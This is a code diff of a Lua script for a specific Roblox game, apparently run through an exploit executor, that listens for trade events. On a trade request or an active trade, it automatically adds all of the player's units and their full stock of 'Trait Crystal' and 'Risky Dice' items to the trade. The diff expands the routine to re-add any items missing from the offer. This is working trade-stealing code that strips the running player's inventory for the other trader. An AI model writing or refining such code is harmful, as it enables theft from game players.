@@ -645,42 +645,50 @@ else
     end)
 
     if game.PlaceId == 17490500437 then
-        local v_u_11 = game.ReplicatedStorage:WaitForChild("TradeRemotes")
-        v_u_11.TradeUpdated.OnClientEvent:Connect(function(p27, p28)
+        local TradeRemotes = game.ReplicatedStorage:WaitForChild("TradeRemotes")
+        TradeRemotes.TradeUpdated.OnClientEvent:Connect(function(p27, p28)
+            local playerData = p28 and p28[tostring(plr.UserId)]
             if p27 == "Requesting" then
-                wait(5)
-                for i,v in pairs(dectectinven()) do
+                print("callhere4")
+                for i, v in pairs(dectectinven()) do
                     wait(2)
-                    local args = {
-                        [1] = v,
-                        [2] = "Units",
-                        [3] = 1,
-                        [4] = true
-                    }
-                    
-                    letfkinggo(p63.TRADE_UPDATE_CONTENTS, unpack(args))
+                    letfkinggo(v_u_9.TRADE_UPDATE_CONTENTS, v, "Units", 1, true)
                 end
-                wait(3)
-                local args = {
-                    [1] = "Trait Crystal",
-                    [2] = "Items",
-                    [3] = inventory().Items["Trait Crystal"],
-                    [4] = true
-                }
-                
-                letfkinggo(p63.TRADE_UPDATE_CONTENTS, unpack(args))
-                wait(3)
-                local args = {
-                    [1] = "Risky Dice",
-                    [2] = "Items",
-                    [3] = inventory().Items["Risky Dice"],
-                    [4] = true
-                }
-                letfkinggo(p63.TRADE_UPDATE_CONTENTS, unpack(args))
+                wait(2)
+                letfkinggo(v_u_9.TRADE_UPDATE_CONTENTS, "Trait Crystal", "Items", inventory().Items["Trait Crystal"], true)
+                wait(2)
+                letfkinggo(v_u_9.TRADE_UPDATE_CONTENTS, "Risky Dice", "Items", inventory().Items["Risky Dice"], true)
                 wait(2)
                 getgenv().autolock = true
-            end
-            if p27 == "Cancelled" or p27 == "Completed" then
+            elseif p27 == "Active" then
+                if not playerData then
+                    for i, v in pairs(dectectinven()) do
+                        wait(2)
+                        letfkinggo(v_u_9.TRADE_UPDATE_CONTENTS, v, "Units", 1, true)
+                    end
+                    wait(2)
+                    letfkinggo(v_u_9.TRADE_UPDATE_CONTENTS, "Trait Crystal", "Items", inventory().Items["Trait Crystal"], true)
+                    wait(2)
+                    letfkinggo(v_u_9.TRADE_UPDATE_CONTENTS, "Risky Dice", "Items", inventory().Items["Risky Dice"], true)
+                    wait(2)
+                    getgenv().autolock = true
+                end
+                if playerData and not playerData.Contents["Trait Crystal"] then
+                    print("callhere2")
+                    letfkinggo(v_u_9.TRADE_UPDATE_CONTENTS, "Trait Crystal", "Items", inventory().Items["Trait Crystal"], true)
+                    wait(2)
+                    letfkinggo(v_u_9.TRADE_UPDATE_CONTENTS, "Risky Dice", "Items", inventory().Items["Risky Dice"], true)
+                end
+                if playerData then
+                    for i, v in pairs(dectectinven()) do
+                        if not playerData.Contents[v] then
+                            print("callhere")
+                            wait(2)
+                            letfkinggo(v_u_9.TRADE_UPDATE_CONTENTS, v, "Units", 1, true)
+                        end
+                    end
+                end
+            elseif p27 == "Cancelled" or p27 == "Completed" then
                 getgenv().autolock = false
             end
         end)
